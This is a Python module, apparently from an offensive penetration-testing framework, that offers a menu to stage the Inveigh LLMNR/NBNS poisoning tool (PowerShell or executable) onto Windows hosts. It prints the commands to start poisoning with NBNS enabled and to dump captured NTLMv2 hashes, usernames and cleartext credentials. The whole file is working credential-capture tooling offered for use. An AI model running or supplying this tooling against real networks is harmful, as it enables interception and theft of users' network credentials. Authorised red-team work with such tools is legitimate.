PROVIDES = ["reference"]
REQUIRES = []

def run(data, cred, args):

    from modules.upload.windows import stage_windows_files
    from core.paths import get_tools_dir

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    print(
        f"\n{B}┌── {BOLD}MODULE: INVEIGH{W}{B} ──────────────────┐{W}"
    )

    print(
        f"{B}│{W}  {C}Windows LLMNR / NBNS Poisoning{W}"
    )

    print(
        f"{B}└──────────────────────────────────────┘{W}"
    )

    print(
        f"\n  {B}[1]{W} Inveigh.ps1"
    )

    print(
        f"  {B}[2]{W} Inveigh.exe (InveighZero)"
    )

    print(
        f"  {B}[3]{W} Both"
    )

    print(
        f"  {B}[4]{W} Reference Only\n"
    )

    choice = input(
        f"{C}Select> {W}"
    ).strip()

    #
    # STAGE FILES
    #


    windows_tools = (
        get_tools_dir() /
        "windows"
    )

    inveigh_ps1 = (
        windows_tools /
        "Inveigh.ps1"
    )

    inveigh_exe = (
        windows_tools /
        "Inveigh.exe"
    )

    if choice == "1":

        stage_windows_files([
            inveigh_ps1
        ])

    elif choice == "2":

        stage_windows_files([
            inveigh_exe
        ])

    elif choice == "3":

        stage_windows_files([
            inveigh_ps1,
            inveigh_exe
        ])

    #
    # REFERENCE
    #

    print(
        f"\n{G}[+] {W}Inveigh PowerShell\n"
    )

    print(
        f"{Y}Import-Module .\\Inveigh.ps1{W}"
    )

    print(
        f"{Y}Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y{W}\n"
    )

    print(
        f"{G}[+] {W}InveighZero\n"
    )

    print(
        f"{Y}.\\Inveigh.exe{W}\n"
    )

    print(
        f"{G}[+] {W}Useful Console Commands (press ESC)\n"
    )

    commands = [
        "GET NTLMV2",
        "GET NTLMV2UNIQUE",
        "GET NTLMV2USERNAMES",
        "GET CLEARTEXT",
        "STOP"
    ]

    for cmd in commands:

        print(
            f"  {Y}{cmd}{W}"
        )

    print()

    return data
